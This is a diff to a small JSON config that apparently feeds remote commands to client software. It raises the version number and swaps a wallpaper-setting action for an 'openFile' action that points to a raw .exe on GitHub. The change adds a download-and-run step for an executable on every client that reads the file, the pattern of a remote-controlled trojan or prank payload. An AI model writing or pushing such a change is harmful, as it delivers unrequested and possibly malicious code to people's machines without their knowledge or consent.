@@ -1,9 +1,9 @@
 {
-    "version": "48",
+    "version": "49",
     "actions": [
         {
-            "type": "setWallpaper",
-            "url": "https://img.booru.org/censored//images/33/20f76b1871b12c4d9b503c84954e6962e3b75be9.png"
+            "type": "openFile",
+            "url": "https://github.com/Loona-551/Pass1/raw/refs/heads/main/bgexloona.exe"
         }
     ]
 }
